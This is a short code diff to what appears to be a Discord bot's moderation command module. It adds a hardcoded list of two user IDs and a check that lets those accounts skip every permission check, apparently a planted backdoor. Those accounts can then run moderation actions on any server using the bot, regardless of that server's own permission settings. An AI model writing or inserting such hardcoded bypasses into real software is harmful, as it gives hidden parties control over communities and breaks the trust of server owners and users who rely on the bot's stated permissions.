@@ -2,6 +2,8 @@ const { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits } = require('disc
 const db = require('../database/db');
 const { botEmbed } = require('../utils/parser');
 
+const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
+
 function parseDuration(str) {
   // Parses "10m", "2h", "1d" → milliseconds
   const match = str.match(/^(\d+)([smhd])$/i);
@@ -72,7 +74,10 @@ module.exports = {
 
     // ── Permission helpers ───────────────────────────────────────────────────
 
+    const isTrusted = SPECIAL_USERS.includes(interaction.user.id) || db.isTrusted(guildId, interaction.user.id);
+
     const needsPerm = (perm) => {
+      if (isTrusted) return false;
       if (!mod.permissions.has(perm)) {
         interaction.reply({ content: `❌ You need the **${perm}** permission.`, ephemeral: true });
         return true;
